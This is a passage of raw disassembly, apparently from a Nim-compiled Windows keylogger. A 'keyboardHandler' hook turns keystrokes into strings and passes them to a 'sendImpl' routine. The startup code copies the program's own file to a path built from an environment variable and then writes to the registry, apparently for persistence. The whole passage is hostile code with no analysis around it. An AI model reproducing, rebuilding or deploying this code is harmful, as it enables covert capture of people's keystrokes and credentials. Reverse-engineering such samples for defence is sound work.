  405cb8:	41 54                	push   %r12
  405cba:	55                   	push   %rbp
  405cbb:	57                   	push   %rdi
  405cbc:	56                   	push   %rsi
  405cbd:	53                   	push   %rbx
  405cbe:	48 83 ec 48          	sub    $0x48,%rsp
  405cc2:	85 c9                	test   %ecx,%ecx
  405cc4:	89 cf                	mov    %ecx,%edi
  405cc6:	48 89 d5             	mov    %rdx,%rbp
  405cc9:	4d 89 c4             	mov    %r8,%r12
  405ccc:	0f 85 d0 01 00 00    	jne    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405cd2:	4d 63 28             	movslq (%r8),%r13
  405cd5:	4c 8d 0d 24 82 00 00 	lea    0x8224(%rip),%r9        # 40df00 <TM__6xDbQkzVUgF9a7K69bKsIjWQ_195>
  405cdc:	b9 a1 b0 b9 12       	mov    $0x12b9b0a1,%ecx
  405ce1:	4d 85 ed             	test   %r13,%r13
  405ce4:	4c 89 eb             	mov    %r13,%rbx
  405ce7:	49 0f 45 cd          	cmovne %r13,%rcx
  405ceb:	48 89 ca             	mov    %rcx,%rdx
  405cee:	81 e2 ff 01 00 00    	and    $0x1ff,%edx
  405cf4:	48 6b c2 18          	imul   $0x18,%rdx,%rax
  405cf8:	4c 01 c8             	add    %r9,%rax
  405cfb:	4c 8b 40 10          	mov    0x10(%rax),%r8
  405cff:	4d 85 c0             	test   %r8,%r8
  405d02:	0f 84 ee 00 00 00    	je     405df6 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x140>
  405d08:	49 39 c8             	cmp    %rcx,%r8
  405d0b:	75 06                	jne    405d13 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x5d>
  405d0d:	4c 3b 68 18          	cmp    0x18(%rax),%r13
  405d11:	74 0b                	je     405d1e <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x68>
  405d13:	48 ff c2             	inc    %rdx
  405d16:	81 e2 ff 01 00 00    	and    $0x1ff,%edx
  405d1c:	eb d6                	jmp    405cf4 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x3e>
  405d1e:	48 8b 48 20          	mov    0x20(%rax),%rcx
  405d22:	e8 9c e3 ff ff       	call   4040c3 <copyString>
  405d27:	48 89 ea             	mov    %rbp,%rdx
  405d2a:	48 83 e2 fb          	and    $0xfffffffffffffffb,%rdx
  405d2e:	48 81 fa 00 01 00 00 	cmp    $0x100,%rdx
  405d35:	74 0e                	je     405d45 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x8f>
  405d37:	48 81 fa 01 01 00 00 	cmp    $0x101,%rdx
  405d3e:	74 0f                	je     405d4f <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x99>
  405d40:	e9 5d 01 00 00       	jmp    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405d45:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  405d4a:	e9 8b 00 00 00       	jmp    405dda <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x124>
  405d4f:	83 fb 11             	cmp    $0x11,%ebx
  405d52:	74 3f                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d54:	81 fb a2 00 00 00    	cmp    $0xa2,%ebx
  405d5a:	74 37                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d5c:	89 da                	mov    %ebx,%edx
  405d5e:	83 e2 fd             	and    $0xfffffffd,%edx
  405d61:	83 fa 10             	cmp    $0x10,%edx
  405d64:	74 2d                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d66:	83 fb 14             	cmp    $0x14,%ebx
  405d69:	74 28                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d6b:	8d 93 70 ff ff ff    	lea    -0x90(%rbx),%edx
  405d71:	83 fa 15             	cmp    $0x15,%edx
  405d74:	76 0e                	jbe    405d84 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xce>
  405d76:	83 eb 5b             	sub    $0x5b,%ebx
  405d79:	83 fb 01             	cmp    $0x1,%ebx
  405d7c:	0f 87 20 01 00 00    	ja     405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405d82:	eb 0f                	jmp    405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d84:	b9 01 00 3b 00       	mov    $0x3b0001,%ecx
  405d89:	48 0f a3 d1          	bt     %rdx,%rcx
  405d8d:	0f 83 0f 01 00 00    	jae    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405d93:	48 89 c1             	mov    %rax,%rcx
  405d96:	31 db                	xor    %ebx,%ebx
  405d98:	e8 26 e3 ff ff       	call   4040c3 <copyString>
  405d9d:	48 85 c0             	test   %rax,%rax
  405da0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  405da5:	74 03                	je     405daa <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xf4>
  405da7:	48 8b 18             	mov    (%rax),%rbx
  405daa:	48 8d 53 01          	lea    0x1(%rbx),%rdx
  405dae:	48 89 c1             	mov    %rax,%rcx
  405db1:	e8 4e e3 ff ff       	call   404104 <setLengthStr>
  405db6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  405dbb:	48 89 c2             	mov    %rax,%rdx
  405dbe:	e8 ff d0 ff ff       	call   402ec2 <unsureAsgnRef>
  405dc3:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
  405dc8:	48 8d 43 ff          	lea    -0x1(%rbx),%rax
  405dcc:	48 85 c0             	test   %rax,%rax
  405dcf:	7f 18                	jg     405de9 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x133>
  405dd1:	c6 42 11 2f          	movb   $0x2f,0x11(%rdx)
  405dd5:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
  405dda:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
  405ddf:	e8 bf fc ff ff       	call   405aa3 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21>
  405de4:	e9 b9 00 00 00       	jmp    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405de9:	8a 4c 02 10          	mov    0x10(%rdx,%rax,1),%cl
  405ded:	88 4c 02 11          	mov    %cl,0x11(%rdx,%rax,1)
  405df1:	48 ff c8             	dec    %rax
  405df4:	eb d6                	jmp    405dcc <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x116>
  405df6:	48 8d 0d 83 f3 01 00 	lea    0x1f383(%rip),%rcx        # 425180 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_>
  405dfd:	ba 30 00 00 00       	mov    $0x30,%edx
  405e02:	e8 df de ff ff       	call   403ce6 <newObj>
  405e07:	4c 89 e9             	mov    %r13,%rcx
  405e0a:	48 89 c6             	mov    %rax,%rsi
  405e0d:	48 8d 05 ac f3 01 00 	lea    0x1f3ac(%rip),%rax        # 4251c0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_>
  405e14:	48 89 06             	mov    %rax,(%rsi)
  405e17:	48 8d 05 2b 64 00 00 	lea    0x642b(%rip),%rax        # 40c249 <.rdata+0x249>
  405e1e:	48 89 46 10          	mov    %rax,0x10(%rsi)
  405e22:	e8 88 e3 ff ff       	call   4041af <nimIntToStr>
  405e27:	b9 0f 00 00 00       	mov    $0xf,%ecx
  405e2c:	48 85 c0             	test   %rax,%rax
  405e2f:	49 89 c5             	mov    %rax,%r13
  405e32:	74 08                	je     405e3c <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x186>
  405e34:	49 8b 45 00          	mov    0x0(%r13),%rax
  405e38:	48 8d 48 0f          	lea    0xf(%rax),%rcx
  405e3c:	e8 0b df ff ff       	call   403d4c <rawNewString>
  405e41:	48 8d 15 78 b5 00 00 	lea    0xb578(%rip),%rdx        # 4113c0 <TM__4SoG2KRQy3oMm9aUzSLtGrA_2>
  405e48:	48 89 c1             	mov    %rax,%rcx
  405e4b:	49 89 c1             	mov    %rax,%r9
  405e4e:	e8 2a bb ff ff       	call   40197d <appendString.part.0>
  405e53:	4c 89 ea             	mov    %r13,%rdx
  405e56:	4c 89 c9             	mov    %r9,%rcx
  405e59:	e8 45 bb ff ff       	call   4019a3 <appendString.lto_priv.49>
  405e5e:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
  405e62:	4c 89 ca             	mov    %r9,%rdx
  405e65:	e8 96 d0 ff ff       	call   402f00 <asgnRef.lto_priv.65>
  405e6a:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  405e6e:	31 d2                	xor    %edx,%edx
  405e70:	e8 8b d0 ff ff       	call   402f00 <asgnRef.lto_priv.65>
  405e75:	4c 8d 0d bf 63 00 00 	lea    0x63bf(%rip),%r9        # 40c23b <.rdata+0x23b>
  405e7c:	48 89 f1             	mov    %rsi,%rcx
  405e7f:	48 c7 44 24 20 06 01 	movq   $0x106,0x20(%rsp)
  405e86:	00 00 
  405e88:	4c 8d 05 b7 63 00 00 	lea    0x63b7(%rip),%r8        # 40c246 <.rdata+0x246>
  405e8f:	48 8d 15 b3 63 00 00 	lea    0x63b3(%rip),%rdx        # 40c249 <.rdata+0x249>
  405e96:	e8 1d f4 ff ff       	call   4052b8 <raiseExceptionEx>
  405e9b:	31 c0                	xor    %eax,%eax
  405e9d:	e9 85 fe ff ff       	jmp    405d27 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x71>
  405ea2:	4d 89 e1             	mov    %r12,%r9
  405ea5:	49 89 e8             	mov    %rbp,%r8
  405ea8:	89 fa                	mov    %edi,%edx
  405eaa:	31 c9                	xor    %ecx,%ecx
  405eac:	ff 15 36 4e 02 00    	call   *0x24e36(%rip)        # 42ace8 <Dl_30890001_>
  405eb2:	48 83 c4 48          	add    $0x48,%rsp
  405eb6:	5b                   	pop    %rbx
  405eb7:	5e                   	pop    %rsi
  405eb8:	5f                   	pop    %rdi
  405eb9:	5d                   	pop    %rbp
  405eba:	41 5c                	pop    %r12
  405ebc:	41 5d                	pop    %r13
  405ebe:	c3                   	ret

0000000000405ebf <incrSeqV3>:
  405ebf:	57                   	push   %rdi
  405ec0:	56                   	push   %rsi
  405ec1:	53                   	push   %rbx
  405ec2:	48 83 ec 20          	sub    $0x20,%rsp
  405ec6:	48 85 c9             	test   %rcx,%rcx
  405ec9:	48 89 cb             	mov    %rcx,%rbx
  405ecc:	48 89 d6             	mov    %rdx,%rsi
  405ecf:	74 4a                	je     405f1b <incrSeqV3+0x5c>
  405ed1:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  405ed8:	ff ff 3f 
  405edb:	48 23 4b 08          	and    0x8(%rbx),%rcx
  405edf:	48 3b 0b             	cmp    (%rbx),%rcx
  405ee2:	7f 4e                	jg     405f32 <incrSeqV3+0x73>
  405ee4:	e8 f4 b6 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  405ee9:	48 89 f1             	mov    %rsi,%rcx
  405eec:	48 89 c2             	mov    %rax,%rdx
  405eef:	e8 e3 f7 ff ff       	call   4056d7 <newSeq>
  405ef4:	48 8b 0b             	mov    (%rbx),%rcx
  405ef7:	4c 8b 46 10          	mov    0x10(%rsi),%r8
  405efb:	48 8d 50 10          	lea    0x10(%rax),%rdx
  405eff:	48 8d 73 10          	lea    0x10(%rbx),%rsi
  405f03:	48 89 d7             	mov    %rdx,%rdi
  405f06:	48 89 08             	mov    %rcx,(%rax)
  405f09:	49 0f af 08          	imul   (%r8),%rcx
  405f0d:	f3 a4                	rep movsb (%rsi),(%rdi)
  405f0f:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  405f16:	48 89 c3             	mov    %rax,%rbx
  405f19:	eb 17                	jmp    405f32 <incrSeqV3+0x73>
  405f1b:	ba 01 00 00 00       	mov    $0x1,%edx
  405f20:	48 89 f1             	mov    %rsi,%rcx
  405f23:	e8 af f7 ff ff       	call   4056d7 <newSeq>
  405f28:	48 89 c3             	mov    %rax,%rbx
  405f2b:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  405f32:	48 89 d8             	mov    %rbx,%rax
  405f35:	48 83 c4 20          	add    $0x20,%rsp
  405f39:	5b                   	pop    %rbx
  405f3a:	5e                   	pop    %rsi
  405f3b:	5f                   	pop    %rdi
  405f3c:	c3                   	ret

0000000000405f3d <NimMainInner>:
  405f3d:	41 57                	push   %r15
  405f3f:	41 56                	push   %r14
  405f41:	41 55                	push   %r13
  405f43:	41 54                	push   %r12
  405f45:	55                   	push   %rbp
  405f46:	57                   	push   %rdi
  405f47:	56                   	push   %rsi
  405f48:	53                   	push   %rbx
  405f49:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
  405f50:	48 8d 0d e4 d3 ff ff 	lea    -0x2c1c(%rip),%rcx        # 40333b <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_2>
  405f57:	be 04 01 00 00       	mov    $0x104,%esi
  405f5c:	48 8d 2d 9d 60 00 00 	lea    0x609d(%rip),%rbp        # 40c000 <.rdata>
  405f63:	e8 b6 be ff ff       	call   401e1e <nimRegisterGlobalMarker>
  405f68:	48 8d 0d da d3 ff ff 	lea    -0x2c26(%rip),%rcx        # 403349 <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_3>
  405f6f:	e8 aa be ff ff       	call   401e1e <nimRegisterGlobalMarker>
  405f74:	ff 15 ae 4d 02 00    	call   *0x24dae(%rip)        # 42ad28 <Dl_32995001_>
  405f7a:	ba 04 01 00 00       	mov    $0x104,%edx
  405f7f:	48 8d 0d 7a 60 00 00 	lea    0x607a(%rip),%rcx        # 40c000 <.rdata>
  405f86:	e8 f5 de ff ff       	call   403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>
  405f8b:	48 89 c7             	mov    %rax,%rdi
  405f8e:	31 c9                	xor    %ecx,%ecx
  405f90:	41 89 f0             	mov    %esi,%r8d
  405f93:	48 89 fa             	mov    %rdi,%rdx
  405f96:	ff 15 6c 3c 02 00    	call   *0x23c6c(%rip)        # 429c08 <Dl_14037022_>
  405f9c:	85 c0                	test   %eax,%eax
  405f9e:	89 c3                	mov    %eax,%ebx
  405fa0:	74 23                	je     405fc5 <NimMainInner+0x88>
  405fa2:	39 c6                	cmp    %eax,%esi
  405fa4:	48 63 d0             	movslq %eax,%rdx
  405fa7:	7c 0d                	jl     405fb6 <NimMainInner+0x79>
  405fa9:	48 89 f9             	mov    %rdi,%rcx
  405fac:	e8 a0 e3 ff ff       	call   404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44>
  405fb1:	48 89 c3             	mov    %rax,%rbx
  405fb4:	eb 11                	jmp    405fc7 <NimMainInner+0x8a>
  405fb6:	48 89 e9             	mov    %rbp,%rcx
  405fb9:	89 de                	mov    %ebx,%esi
  405fbb:	e8 c0 de ff ff       	call   403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>
  405fc0:	48 89 c7             	mov    %rax,%rdi
  405fc3:	eb c9                	jmp    405f8e <NimMainInner+0x51>
  405fc5:	31 db                	xor    %ebx,%ebx
  405fc7:	ff 15 8b 4d 02 00    	call   *0x24d8b(%rip)        # 42ad58 <Dl_61320001_>
  405fcd:	48 8d 0d ec b4 00 00 	lea    0xb4ec(%rip),%rcx        # 4114c0 <TM__ngdzsFozov7SgOThmPolog_2>
  405fd4:	ff c8                	dec    %eax
  405fd6:	0f 84 aa 01 00 00    	je     406186 <NimMainInner+0x249>
  405fdc:	e8 bf bc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  405fe1:	49 89 c5             	mov    %rax,%r13
  405fe4:	e8 b7 bc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  405fe9:	49 89 c6             	mov    %rax,%r14
  405fec:	e8 af bc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  405ff1:	80 b8 50 34 00 00 00 	cmpb   $0x0,0x3450(%rax)
  405ff8:	48 89 c6             	mov    %rax,%rsi
  405ffb:	0f 85 c0 00 00 00    	jne    4060c1 <NimMainInner+0x184>
  406001:	4c 8d a0 58 34 00 00 	lea    0x3458(%rax),%r12
  406008:	31 d2                	xor    %edx,%edx
  40600a:	4c 89 e1             	mov    %r12,%rcx
  40600d:	e8 b0 ce ff ff       	call   402ec2 <unsureAsgnRef>
  406012:	ff 15 e8 3b 02 00    	call   *0x23be8(%rip)        # 429c00 <Dl_14037645_>
  406018:	48 85 c0             	test   %rax,%rax
  40601b:	48 89 c7             	mov    %rax,%rdi
  40601e:	0f 84 9d 00 00 00    	je     4060c1 <NimMainInner+0x184>
  406024:	49 89 c7             	mov    %rax,%r15
  406027:	31 d2                	xor    %edx,%edx
  406029:	4c 89 f9             	mov    %r15,%rcx
  40602c:	e8 8f 23 00 00       	call   4083c0 <wcschr>
  406031:	4c 89 f9             	mov    %r15,%rcx
  406034:	ba 50 00 00 00       	mov    $0x50,%edx
  406039:	48 89 c5             	mov    %rax,%rbp
  40603c:	e8 10 e3 ff ff       	call   404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44>
  406041:	48 8b 8e 58 34 00 00 	mov    0x3458(%rsi),%rcx
  406048:	48 8d 15 31 3e 02 00 	lea    0x23e31(%rip),%rdx        # 429e80 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_>
  40604f:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
  406054:	e8 66 fe ff ff       	call   405ebf <incrSeqV3>
  406059:	4c 89 e1             	mov    %r12,%rcx
  40605c:	48 89 c2             	mov    %rax,%rdx
  40605f:	e8 5e ce ff ff       	call   402ec2 <unsureAsgnRef>
  406064:	48 8b 86 58 34 00 00 	mov    0x3458(%rsi),%rax
  40606b:	48 8b 10             	mov    (%rax),%rdx
  40606e:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  406072:	48 89 08             	mov    %rcx,(%rax)
  406075:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
  40607a:	4c 8d 04 d0          	lea    (%rax,%rdx,8),%r8
  40607e:	4d 8b 78 10          	mov    0x10(%r8),%r15
  406082:	4c 89 44 24 58       	mov    %r8,0x58(%rsp)
  406087:	e8 b4 db ff ff       	call   403c40 <copyStringRC1>
  40608c:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
  406091:	4d 85 ff             	test   %r15,%r15
  406094:	49 89 40 10          	mov    %rax,0x10(%r8)
  406098:	74 08                	je     4060a2 <NimMainInner+0x165>
  40609a:	4c 89 f9             	mov    %r15,%rcx
  40609d:	e8 8f ce ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.80>
  4060a2:	66 83 7d 02 00       	cmpw   $0x0,0x2(%rbp)
  4060a7:	4c 8d 7d 02          	lea    0x2(%rbp),%r15
  4060ab:	0f 85 76 ff ff ff    	jne    406027 <NimMainInner+0xea>
  4060b1:	48 89 f9             	mov    %rdi,%rcx
  4060b4:	ff 15 3e 3b 02 00    	call   *0x23b3e(%rip)        # 429bf8 <Dl_14037647_>
  4060ba:	c6 86 50 34 00 00 01 	movb   $0x1,0x3450(%rsi)
  4060c1:	b9 08 00 00 00       	mov    $0x8,%ecx
  4060c6:	e8 81 dc ff ff       	call   403d4c <rawNewString>
  4060cb:	48 8d 15 0e b4 00 00 	lea    0xb40e(%rip),%rdx        # 4114e0 <TM__ngdzsFozov7SgOThmPolog_4>
  4060d2:	48 89 c1             	mov    %rax,%rcx
  4060d5:	49 89 c1             	mov    %rax,%r9
  4060d8:	e8 a0 b8 ff ff       	call   40197d <appendString.part.0>
  4060dd:	49 8b 11             	mov    (%r9),%rdx
  4060e0:	41 c6 44 11 10 3d    	movb   $0x3d,0x10(%r9,%rdx,1)
  4060e6:	48 ff c2             	inc    %rdx
  4060e9:	41 c6 44 11 10 00    	movb   $0x0,0x10(%r9,%rdx,1)
  4060ef:	4d 8b 9e 58 34 00 00 	mov    0x3458(%r14),%r11
  4060f6:	49 89 11             	mov    %rdx,(%r9)
  4060f9:	4d 85 db             	test   %r11,%r11
  4060fc:	74 64                	je     406162 <NimMainInner+0x225>
  4060fe:	49 8b 03             	mov    (%r11),%rax
  406101:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  406105:	31 c0                	xor    %eax,%eax
  406107:	48 39 c6             	cmp    %rax,%rsi
  40610a:	7c 56                	jl     406162 <NimMainInner+0x225>
  40610c:	49 8b 7c c3 10       	mov    0x10(%r11,%rax,8),%rdi
  406111:	31 c9                	xor    %ecx,%ecx
  406113:	48 85 ff             	test   %rdi,%rdi
  406116:	0f 84 f2 0a 00 00    	je     406c0e <NimMainInner+0xcd1>
  40611c:	48 3b 0f             	cmp    (%rdi),%rcx
  40611f:	0f 8d e9 0a 00 00    	jge    406c0e <NimMainInner+0xcd1>
  406125:	48 39 ca             	cmp    %rcx,%rdx
  406128:	0f 8e e0 0a 00 00    	jle    406c0e <NimMainInner+0xcd1>
  40612e:	44 8a 44 0f 10       	mov    0x10(%rdi,%rcx,1),%r8b
  406133:	45 8d 50 bf          	lea    -0x41(%r8),%r10d
  406137:	41 80 fa 19          	cmp    $0x19,%r10b
  40613b:	77 04                	ja     406141 <NimMainInner+0x204>
  40613d:	41 83 c0 20          	add    $0x20,%r8d
  406141:	45 8a 54 09 10       	mov    0x10(%r9,%rcx,1),%r10b
  406146:	41 8d 6a bf          	lea    -0x41(%r10),%ebp
  40614a:	40 80 fd 19          	cmp    $0x19,%bpl
  40614e:	77 04                	ja     406154 <NimMainInner+0x217>
  406150:	41 83 c2 20          	add    $0x20,%r10d
  406154:	45 38 c2             	cmp    %r8b,%r10b
  406157:	0f 85 b1 0a 00 00    	jne    406c0e <NimMainInner+0xcd1>
  40615d:	48 ff c1             	inc    %rcx
  406160:	eb b1                	jmp    406113 <NimMainInner+0x1d6>
  406162:	48 8d 0d 77 b3 00 00 	lea    0xb377(%rip),%rcx        # 4114e0 <TM__ngdzsFozov7SgOThmPolog_4>
  406169:	e8 e3 b3 ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  40616e:	48 89 c1             	mov    %rax,%rcx
  406171:	e8 82 22 00 00       	call   4083f8 <getenv>
  406176:	48 85 c0             	test   %rax,%rax
  406179:	74 08                	je     406183 <NimMainInner+0x246>
  40617b:	48 89 c1             	mov    %rax,%rcx
  40617e:	e8 8d ec ff ff       	call   404e10 <cstrToNimstr>
  406183:	48 89 c1             	mov    %rax,%rcx
  406186:	e8 bb e7 ff ff       	call   404946 <nosjoinPath.constprop.8>
  40618b:	48 85 db             	test   %rbx,%rbx
  40618e:	48 89 c6             	mov    %rax,%rsi
  406191:	0f 84 ed 0a 00 00    	je     406c84 <NimMainInner+0xd47>
  406197:	31 c0                	xor    %eax,%eax
  406199:	48 85 f6             	test   %rsi,%rsi
  40619c:	4c 8b 03             	mov    (%rbx),%r8
  40619f:	74 03                	je     4061a4 <NimMainInner+0x267>
  4061a1:	48 8b 06             	mov    (%rsi),%rax
  4061a4:	49 39 c0             	cmp    %rax,%r8
  4061a7:	75 1e                	jne    4061c7 <NimMainInner+0x28a>
  4061a9:	4d 85 c0             	test   %r8,%r8
  4061ac:	0f 84 0a 01 00 00    	je     4062bc <NimMainInner+0x37f>
  4061b2:	48 8d 56 10          	lea    0x10(%rsi),%rdx
  4061b6:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  4061ba:	e8 59 24 00 00       	call   408618 <memcmp>
  4061bf:	85 c0                	test   %eax,%eax
  4061c1:	0f 84 f5 00 00 00    	je     4062bc <NimMainInner+0x37f>
  4061c7:	48 89 d9             	mov    %rbx,%rcx
  4061ca:	e8 65 de ff ff       	call   404034 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ>
  4061cf:	48 89 f1             	mov    %rsi,%rcx
  4061d2:	48 89 c7             	mov    %rax,%rdi
  4061d5:	e8 5a de ff ff       	call   404034 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ>
  4061da:	45 31 c0             	xor    %r8d,%r8d
  4061dd:	48 89 f9             	mov    %rdi,%rcx
  4061e0:	48 89 c2             	mov    %rax,%rdx
  4061e3:	ff 15 07 3a 02 00    	call   *0x23a07(%rip)        # 429bf0 <Dl_14037631_>
  4061e9:	85 c0                	test   %eax,%eax
  4061eb:	0f 85 cb 00 00 00    	jne    4062bc <NimMainInner+0x37f>
  4061f1:	e8 e0 b3 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  4061f6:	ba 10 00 00 00       	mov    $0x10,%edx
  4061fb:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
  406202:	00 
  406203:	89 c5                	mov    %eax,%ebp
  406205:	e8 b8 b7 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  40620a:	48 89 d9             	mov    %rbx,%rcx
  40620d:	e8 b1 de ff ff       	call   4040c3 <copyString>
  406212:	48 8d 5c 24 70       	lea    0x70(%rsp),%rbx
  406217:	48 89 f1             	mov    %rsi,%rcx
  40621a:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  406221:	00 
  406222:	e8 9c de ff ff       	call   4040c3 <copyString>
  406227:	4c 8b a4 24 a0 00 00 	mov    0xa0(%rsp),%r12
  40622e:	00 
  40622f:	48 8d 0d ea b1 00 00 	lea    0xb1ea(%rip),%rcx        # 411420 <TM__n49a9aYp5BrbXv9a6OCpJYm0g_2>
  406236:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
  40623d:	00 00 
  40623f:	48 89 c7             	mov    %rax,%rdi
  406242:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
  406249:	00 
  40624a:	e8 74 de ff ff       	call   4040c3 <copyString>
  40624f:	48 89 d9             	mov    %rbx,%rcx
  406252:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
  406257:	4c 89 e2             	mov    %r12,%rdx
  40625a:	e8 57 e7 ff ff       	call   4049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>
  40625f:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
  406264:	ba 02 00 00 00       	mov    $0x2,%edx
  406269:	e8 39 e3 ff ff       	call   4045a7 <resizeString>
  40626e:	48 8d 15 8b b1 00 00 	lea    0xb18b(%rip),%rdx        # 411400 <TM__n49a9aYp5BrbXv9a6OCpJYm0g_3>
  406275:	48 89 c1             	mov    %rax,%rcx
  406278:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
  40627d:	e8 fb b6 ff ff       	call   40197d <appendString.part.0>
  406282:	48 89 fa             	mov    %rdi,%rdx
  406285:	48 89 d9             	mov    %rbx,%rcx
  406288:	e8 29 e7 ff ff       	call   4049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>
  40628d:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
  406292:	ba 01 00 00 00       	mov    $0x1,%edx
  406297:	e8 0b e3 ff ff       	call   4045a7 <resizeString>
  40629c:	48 8d 15 3d b1 00 00 	lea    0xb13d(%rip),%rdx        # 4113e0 <TM__n49a9aYp5BrbXv9a6OCpJYm0g_5>
  4062a3:	48 89 c1             	mov    %rax,%rcx
  4062a6:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
  4062ab:	e8 cd b6 ff ff       	call   40197d <appendString.part.0>
  4062b0:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
  4062b5:	89 e9                	mov    %ebp,%ecx
  4062b7:	e8 14 f1 ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  4062bc:	48 8d 0d bd b1 00 00 	lea    0xb1bd(%rip),%rcx        # 411480 <TM__ngdzsFozov7SgOThmPolog_5>
  4062c3:	48 c7 84 24 a0 00 00 	movq   $0x0,0xa0(%rsp)
  4062ca:	00 00 00 00 00 
  4062cf:	e8 ab da ff ff       	call   403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.70>
  4062d4:	48 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%rbx
  4062db:	00 
  4062dc:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
  4062e1:	48 89 c1             	mov    %rax,%rcx
  4062e4:	e8 7f b2 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72>
  4062e9:	45 31 c0             	xor    %r8d,%r8d
  4062ec:	41 b9 02 00 00 00    	mov    $0x2,%r9d
  4062f2:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
  4062f9:	48 89 c2             	mov    %rax,%rdx
  4062fc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
  406301:	ff 15 41 4a 02 00    	call   *0x24a41(%rip)        # 42ad48 <Dl_33470001_>
  406307:	48 8d 0d 32 b1 00 00 	lea    0xb132(%rip),%rcx        # 411440 <TM__ngdzsFozov7SgOThmPolog_6>
  40630e:	e8 6c da ff ff       	call   403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.70>
  406313:	48 89 c1             	mov    %rax,%rcx
  406316:	e8 4d b2 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72>
  40631b:	48 89 f1             	mov    %rsi,%rcx
  40631e:	48 89 c7             	mov    %rax,%rdi
  406321:	e8 59 da ff ff       	call   403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.70>
  406326:	48 89 c1             	mov    %rax,%rcx
  406329:	e8 3a b2 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72>
